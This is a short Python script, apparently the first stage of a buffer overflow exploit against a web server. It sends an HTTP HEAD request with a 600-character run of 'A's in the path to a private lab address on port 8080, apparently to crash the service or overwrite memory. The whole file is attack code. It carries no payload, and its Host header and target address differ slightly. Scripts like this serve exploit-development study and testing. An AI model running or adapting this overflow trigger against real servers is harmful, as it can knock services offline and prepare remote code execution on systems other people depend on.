#!/usr/bin/python

import socket
import os
import sys

Stage1 = "A"*600

buffer = (
"HEAD /" + Stage1 + " HTTP/1.1\r\n"
"Host: 172.16.73.130:8080\r\n"
"User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; he; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12\r\n"
"Keep-Alive: 115\r\n"
"Connection: keep-alive\r\n\r\n")

exp1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
exp1.connect(("172.16.73.129", 8080))
exp1.send(buffer)
exp1.close()